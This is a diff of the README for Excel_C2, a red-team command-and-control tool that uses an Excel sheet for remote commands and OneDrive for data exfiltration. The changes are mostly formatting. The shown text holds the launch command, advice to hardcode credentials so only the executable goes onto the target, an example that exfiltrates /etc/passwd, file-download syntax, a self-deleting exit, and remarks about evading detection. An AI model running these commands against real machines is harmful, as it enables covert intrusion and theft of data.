@@ -1,5 +1,3 @@
-# Inspired from: https://github.com/looCiprian/GC2-sheet
-
 # Excel_C2
 
 Excel_C2 (Excel Command and Control) is a Command and Control application that allows an attacker to execute commands on the target machine using an Office365 Excel sheet and exfiltrates data OneDrive.
@@ -77,7 +75,8 @@ Furthermore, the program will interact only with Microsoft's domains to make det
     <p align="center">
         <img alt="New Workbook" src="img/new-excel.png" height="50%" width="50%">
     </p>
-    1.  You need the ID for the onedrive as well as the ID for the new sheet you've created.  Lucikly Microsft makes it as difficult as possible to find that information.  I was able to get it using Postman.  Follow the guide at [https://learn.microsoft.com/en-us/graph/use-postman](https://learn.microsoft.com/en-us/graph/use-postman) to setup Postman (NOTE: you've already completed Step3 by following this README)
+    1.  You need the ID for the onedrive as well as the ID for the new sheet you've created.  Lucikly Microsft makes it as difficult as possible to find that information.  I was able to get it using Postman.  Follow the guide at [https://learn.microsoft.com/en-us/graph/use-postman](https://learn.microsoft.com/en-us/graph/use-postman) to setup Postman 
+    > NOTE: you've already completed Step3 by following this README
     1.  Once Postman is configured and you're able to authenticate successfully, find the **Get my files** API call and run that
     <p align="center">
         <img alt="Get My Files" src="img/get-my-files.png" height="50%" width="50%">
@@ -102,13 +101,13 @@ Furthermore, the program will interact only with Microsoft's domains to make det
     excel-c2 --tenant <tenantId> --client <clientId> --secret <clientSecret> --drive <driveId> --sheet <sheedId> --verbos <true|false>
     ```
    
-   PS: you can also hardcode the parameters in the code, so you will upload only the executable on the target machine (look at comments in root.go)
+   > Note: you can also hardcode the parameters in the code, so you will upload only the executable on the target machine (look at comments in root.go)
 
 ## Features
 
 - Command execution using Office365 Excel Sheet as a console
 - Download files on the target using Microsfot OneDrive
-- Data exfiltration using Microsft OneDrive
+- Upload files (data exfiltration) using Microsft OneDrive
 - Exit
 
 ### Command execution
@@ -127,7 +126,7 @@ Example:
  ```
 upload;/etc/passwd
  ```
-DO **NOT** add spaces.
+> NOTE: DO **NOT** add spaces.
 
 ### Download File
 
@@ -140,14 +139,14 @@ Example:
  ```
 download;down.txt;/home/user/downloaded.txt
  ```
-DO **NOT** add spaces.
+> NOTE: DO **NOT** add spaces.
 
 ### Exit
 
 By sending the command *exit*, the program will delete itself from the target and kill its process
 
-PS: From *os* documentation: 
-*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case the symlink is deleted.
+> NOTE: From *os* documentation: 
+> *If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case the symlink is deleted.
 
 ### WorkFlow
 
@@ -162,6 +161,9 @@ The owner of this project is not responsible for any illegal usage of this progr
 This is an open source project meant to be used with authorization to assess the security posture and for research purposes.
 
 The final user is solely responsible for their actions and decisions. The use of this project is at your own risk. The owner of this project does not accept any liability for any loss or damage caused by the use of this project.
+
+# Inspired from: https://github.com/looCiprian/GC2-sheet
+
 
 # Support the project
 
